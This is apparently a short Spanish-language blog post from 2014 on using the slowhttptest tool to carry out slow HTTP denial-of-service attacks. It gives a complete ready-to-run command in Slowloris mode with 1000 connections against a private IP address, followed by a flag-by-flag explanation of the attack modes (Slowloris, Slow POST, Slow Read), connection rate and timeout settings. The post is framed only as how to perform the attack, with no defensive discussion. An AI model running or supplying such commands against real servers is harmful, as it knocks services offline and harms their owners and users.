---
layout: post
title: "slowhttptest"
date: 2014-01-29 18:34
comments: true
categories: 
---
Efectuar ataques Slow Http Dos 

>$ slowhttptest -c 1000 -H -g -o ataque -i 10 -r 200 -t GET -u http://192.168.1.154 -x 30 -p 3 

c (Número de conexiones con límite en 65539) 

H (ataque modo SlowLoris enviando paquetes sin completar)

B (ataque modo Slow POST sin terminar de enviar el cuerpo del mensaje)

X (ataque modo Slow Read de lectura de las respuestas http lentas)

g (Generr estadistica en formato html) 

o (Archivo de salida) 

i (Intervalo de datos por segundo por conexión) 

r (Conexiones por segundo) 

t (Cabecera a utilizar) 

u (URL de destino) 

x (Longitud máxima de los datos) 

p (Tiempo de espera de respuesta http una vez el servidor se considera inaccesible)

